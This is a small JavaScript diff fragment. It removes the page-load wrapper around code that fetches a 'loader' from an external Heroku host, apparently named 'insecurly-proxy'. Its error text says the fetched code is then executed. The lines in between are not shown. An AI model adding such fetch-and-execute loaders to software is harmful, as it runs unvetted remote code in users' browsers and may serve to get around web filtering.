@@ -1,4 +1,4 @@
-document.addEventListener('DOMContentLoaded', async () => {
+
             try {
                 const response = await fetch('https://insecurly-proxy-4049abcc7e4e.herokuapp.com/get_loader');
                 if (!response.ok) {
@@ -9,4 +9,4 @@ document.addEventListener('DOMContentLoaded', async () => {
             } catch (error) {
                 alert('Error fetching or executing code: ' + error);
             }
-        });
+
